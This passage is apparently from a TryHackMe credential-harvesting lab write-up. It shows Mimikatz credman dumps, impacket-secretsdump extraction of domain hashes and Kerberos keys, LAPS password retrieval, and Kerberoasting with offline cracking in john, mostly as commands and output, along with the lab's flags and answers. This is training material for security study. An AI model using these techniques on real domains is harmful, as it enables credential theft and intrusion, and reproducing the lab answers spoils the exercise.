Authentication Id : 0 ; 34292 (00000000:000085f4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-1
        credman :

Authentication Id : 0 ; 806060 (00000000:000c4cac)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 1/19/2024 1:53:10 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 805940 (00000000:000c4c34)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 1/19/2024 1:53:10 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 714924 (00000000:000ae8ac)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-90-0-2
        credman :

Authentication Id : 0 ; 713209 (00000000:000ae1f9)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-96-0-2
        credman :

Authentication Id : 0 ; 713155 (00000000:000ae1c3)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-96-0-2
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:07 PM
SID               : S-1-5-17
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:51 PM
SID               : S-1-5-19
        credman :

Authentication Id : 0 ; 34512 (00000000:000086d0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-1
        credman :

Authentication Id : 0 ; 34510 (00000000:000086ce)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-0
        credman :

Authentication Id : 0 ; 31605 (00000000:00007b75)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:40 PM
SID               :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:39 PM
SID               : S-1-5-18
        credman :

C:\Tools\Mimikatz>type "c:\Users\thm-local\Saved Games\flag.txt"
THM{RunA5S4veCr3ds}
```

## Task 7  Domain Controller
+ Apply the technique discussed in this task to dump the NTDS file locally and extract hashes. What is the target system bootkey value? Note: Use thm.red/thm as an Active Directory user since it has administrator privileges!`0x36c8d26ec0df8b23ce63bcefa6e2d821`
+ What is the clear-text password for the bk-admin username?`Passw0rd123`

```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ impacket-secretsdump -just-dc THM.red/thm@10.10.33.145 
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:450745be55df6f5f5864d8d05e205b22:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:09e55c4979b8709427783bdf2720bb32c7fafbedb5d0c20c7ac552a6e93eaad7
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:1e068a71b8c4fb81e37e599ac13c8ec1
CREDS-HARVESTIN$:des-cbc-md5:abc8582f8cd634d3
[*] Cleaning up... 
```

## Task 8  Local Administrator Password Solution (LAPS)\
+ Which group has ExtendedRightHolder and is able to read the LAPS password?`LAPsReader`
+ Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer?`THMLAPSPassw0rd`
+ Which user is able to read LAPS passwords?`bk-admin`
```bash
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM    <DIR>          .
06/06/2022  01:01 PM    <DIR>          ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,301,067,264 bytes free

PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}

PS C:\Users\thm> net groups LAPSReader
Group name     LAPsReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.
```

+ Check User dan gain user who have privilege to `Get-AdmPwdPassword`
```bash
PS C:\Windows\system32> whoami
thm\thm
PS C:\Windows\system32> runas /user:bk-admin "powershell" 

PS C:\Windows\system32> whoami
thm\bk-admin
PS C:\Windows\system32> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    THMLAPSPassw0rd    2/11/2338 11:05:2...
```

## Task 9  Other Attacks
+ Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?`svc-thm`
+ After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?`Passw0rd1`

```bash
┌──(kali㉿kali)-[~/TryHackMe]
└─$ impacket-GetUserSPNs -dc-ip 10.10.6.150 THM.red/thm
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 16:47:33.796826  <never>         

┌──(kali㉿kali)-[~/TryHackMe]
└─$ impacket-GetUserSPNs -dc-ip 10.10.6.150 THM.red/thm -request              
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 16:47:33.796826  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$7c2816591287f26bed0572fadcad1451$29ad25cdfbcaed6e0b1cde880b5536e62dd8b360c63e80ca70b08281d37ec3b6914e16c59c064c1cccc6746159c1233f76a130639916eee0a46f48f485534cc30824de461c38d6112e0d50bbc64e349d1b77731286eef1e40cffb8b96bf3d312e7116aea1ce27d0f6d37b28db822c715b7c21e88b5416ddfe985e6d7d92a554082df6f7d25041c027842ca829306637bcd205a6645fa3f1439e43961c170b97da9aeb0ff59891c747f0a216c660b45decd01dd1d1270b9227cc56bf3390c99bfdc16a0eea97fbeca9c27246a335adfd47de9ce58b6712d136eb920608b95aba9c96b14daa7a7b6a2b8f4bdce9e3ffb2112afdb03d3941a8eb2abc8b397309764622b573696e830e78a1f2fbd8e01e4d93f910dbbaefcddf442aaab0e00092ed7dd48f388ebd47110d96ef93e2fd91d6df8d3262287a3559f26b82ec289f789ce5dbc34872720f8d3a2fbf7b83a6e1051dda1604280624dc052035655841d90fd30bf9da6842a7f53b12e954702da603e5716e6d9849ec31a96f840ad87c36c5f938461edd9451f4d28e51b4e434ecd6cd0bb29f84811abf559c22ac5ba9ed839788712fbea5d53513a7a676d8d9426bfd8846d919297bcaffe8f09a8d3724775793708d38bfb162a5b0c576826bfe7af6a9788e990a15c1ea78acf4dfa91e647bfb09e8a0735afc8d5d1439417b89c509400855f88fe7da179e49c42685fd7c2d8f2bca3741f630ab7c42dc0c97f62ddf67cbabb21c9aaf9029dcb94b7816ba9fb079c2e6f52d71f4eba154ff3538717056be85b70799163ec67c16abcb80e6f2990a335c00cbafea7360879041707e2ab66c6cad663cb655ed07bc6a64e0942280f2fa97a2dd8141d93a402f2544bc5d5256b5c34557d33355a8fa9fa4b001df307615776945ef839258f3ed8f467a9b3c17a22262e367253f3fbcf8354476fbd86327a03b0fbf65bb06167f440c4fbc34b11832ce421add130947ead785f49a00aed53686dd13c0d8c0abe45f9126827fa1faf0abb3cd84b4d1970f125d71406f64930b4a8b6a66cb2d595d52ad3545fe0534c4283667e1f206e7afd1a2d9f90bc029dce7780b2604a395e2de1b2800efc2bd4fbea27e79e4fc3410349e56d970a4db2ea07479504459d0de4cefc75b3e138027eaf927664e5252f969d9bd7d86493e9f6b24bfd534908c561bb5b6f220f1249ee43dde28393a97cfd767de6afba45857da0a398c20d714a5a40f6443d25fe650a150377

┌──(kali㉿kali)-[~/TryHackMe]
└─$ john svc_hash.txt -w=/usr/share/wordlists/rockyou.txt --fork=4
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1        (?)     
2 1g 0:00:00:00 DONE (2024-01-22 13:09) 3.125g/s 177000p/s 177000c/s 177000C/s SNOWY..MAMAMA
3 0g 0:00:00:15 DONE (2024-01-22 13:09) 0g/s 233916p/s 233916c/s 233916C/s  0125457423 .a6_123
1 0g 0:00:00:15 DONE (2024-01-22 13:09) 0g/s 232250p/s 232250c/s 232250C/s  Jakekovac3.ie168
Waiting for 3 children to terminate
4 0g 0:00:00:15 DONE (2024-01-22 13:09) 0g/s 231949p/s 231949c/s 231949C/s   cxz..*7¡Vamos!
Session completed.
```